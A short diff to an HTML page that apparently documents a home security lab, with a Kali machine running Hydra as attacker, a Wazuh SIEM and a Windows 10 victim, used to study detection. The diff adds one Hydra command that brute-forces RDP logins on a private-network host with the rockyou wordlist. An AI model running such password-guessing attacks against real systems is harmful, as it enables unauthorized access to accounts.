@@ -6,7 +6,8 @@
 
 <ol>
   <li>Hydra -- (Kali-linux attacker)</li>
-  <pre> </pre>
+  <pre> hydra -l management -P /usr/share/wordlists/rockyou.txt rdp://192.168.10.7 -t 2
+</pre>
   <li>Wazuh Manager -- (SIEM on Ubuntu-Server) </li>
   <li>Window-10 (Endpoint Target Victim)</li>
  
